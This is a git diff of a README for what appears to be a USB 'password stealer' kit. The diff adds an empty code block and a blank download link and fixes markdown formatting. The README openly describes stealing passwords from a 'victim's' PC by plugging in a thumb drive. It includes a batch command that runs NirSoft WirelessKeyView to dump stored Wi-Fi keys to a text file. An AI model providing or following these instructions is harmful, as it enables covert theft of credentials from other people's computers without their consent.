@@ -10,6 +10,10 @@ the file will be password protected. the password of the file is
  the name of the zip file(withou .zip).
 # Installation
 installation is very easy. just clone the repo and extract that zip file.
+```git
+```
+## OR
+### Directly Download The Zip File By [Clicking Here]() 
 # Usage
 You can use it to steale passwords from a pc.
 just copy all files in a usb thumb drive. then insert that in victim's
@@ -27,7 +31,8 @@ so all the passwords of the zip file will be unique
 You Can Download Similar Nirsoft Utilities From [Here](http://www.nirsoft.net/)
 And put the exe file(will be given in the zip file downloaded from nirsoft)
 In the exe folder and add path to script.bat like this
-## Examples```cmd
+## Examples
+```cmd
 start exe\WirelessKeyView.exe /stext text\WirelessKeyView.txt
 ```
 ### just edit the name as the utility name you just downloaded from nirsoft
